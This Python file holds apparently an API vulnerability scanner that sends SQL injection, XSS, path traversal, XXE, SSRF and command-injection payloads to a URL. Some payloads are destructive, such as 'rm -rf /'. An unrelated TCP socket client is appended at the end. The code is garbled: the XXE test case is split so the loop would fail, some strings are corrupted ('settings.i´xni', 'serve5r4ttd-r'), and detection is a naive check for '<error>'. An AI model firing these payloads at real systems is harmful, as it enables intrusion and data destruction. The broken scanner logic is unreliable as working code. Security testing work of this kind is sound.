import requests

def scan_api(url):
    # Define test cases and payloads
    test_cases = [
        # SQL Injection
        {"payload": {"username": "admin' OR '1'='1", "password": "password"}, "vulnerability": "SQL Injection"},
        {"payload": {"id": "1' UNION ALL SELECT table_name FROM information_schema.tables"}, "vulnerability": "SQL Injection"},
        {"payload": {"email": "admin@example.com' OR '1'='1"}, "vulnerability": "SQL Injection"},
        
        # Cross-Site Scripting (XSS)
        {"payload": {"name": "<script>alert('XSS')</script>"}, "vulnerability": "Cross-Site Scripting (XSS)"},
        {"payload": {"input": "<img src='x' onerror='alert(1)'>"}, "vulnerability": "Cross-Site Scripting (XSS)"},
        {"payload": {"message": "<svg/onload=alert('XSS')>"}, "vulnerability": "Cross-Site Scripting (XSS)"},
        
        # Path Traversal
        {"payload": {"file": "../../../etc/passwd"}, "vulnerability": "Path Traversal"},
        {"payload": {"path": "../config/secrets"}, "vulnerability": "Path Traversal"},
        {"payload": {"filename": "../../../../etc/hosts"}, "vulnerability": "Path Traversal"},
        
        # Command Injection
        {"payload": {"command": "ping -c 1 example.com"}, "vulnerability": "Command Injection"},
        {"payload": {"param": "127.0.0.1; ls -la"}, "vulnerability": "Command Injection"},
        {"payload": {"command": "rm -rf /"}, "vulnerability": "Command Injection"},
        
        # XML External Entity (XXE)
        {"payload": "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % remote SYSTEM 'http://example.com/xxe.dtd'><!ENTITY % external_entity_ext SYSTEM 'file:///etc/passwd'><%external_entity_ext;>]>"},
        {"vulnerability": "XML External Entity (XXE)"},
        
        # Server-Side Request Forgery (SSRF)
        {"payload": {"url": "http://internal-server.local/secret-info"}, "vulnerability": "Server-Side Request Forgery (SSRF)"},
        {"payload": {"url": "http://127.0.0.1:22/"}, "vulnerability": "Server-Side Request Forgery (SSRF)"},
        
        # Cross-Site Request Forgery (CSRF)
        {"payload": {"amount": 1000, "recipient": "attacker@example.com"}, "vulnerability": "Cross-Site Request Forgery (CSRF)"},
        {"payload": {"action": "delete", "id": 1234}, "vulnerability": "Cross-Site Request Forgery (CSRF)"},
        
        # Information Disclosure
        {"payload": {"debug": "true"}, "vulnerability": "Information Disclosure"},
        {"payload": {"config": "settings.i´xni"}, "vulnerability": "Information Disclosure"},
        
        # Insecure Direct Object Reference (IDOR)
        {"payload": {"id": 1234}, "vulnerability": "Insecure Direct Object Reference (IDOR)"},
        {"payload": {"user_id": 1000}, "vulnerability": "Insecure Direct Object Reference (IDOR)"},
        
        # Server-Side Code Execution
        {"payload": {"command": "import os; os.system('rm -rf /')"}, "vulnerability": "Server-Side Code Execution"},
        {"payload": {"code": "__import__('os').system('rm -rf /')"}, "vulnerability": "Server-Side Code Execution"},
    ]



    for test_case in test_cases:
        response = requests.get(url, params=test_case["payload"])

        if "<error>" in response.text:
            print(f"Vulnerability Detected: {test_case['vulnerability']}")
            # Perform additional actions like logging, reporting, etc.

if __name__ == '__main__':
    api_url = "http://example.com/api/v1"
    scan_api(api_url)

import socket

def send_message(message):
    # Create a TCP socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    server_address = ('localhost', 9999)
    client_socket.connect(server_address)

    # Send the message to the serve5r4ttd-r
    client_socket.send(message.encode())

    # Receive the response from the server
    response = client_socket.recv(1024).decode()
    print(f'Response from server: {response}')

    # Close the socket
    client_socket.close()

if __name__ == '__main__':
    message = input('Enter your message: ')
    send_message(message)

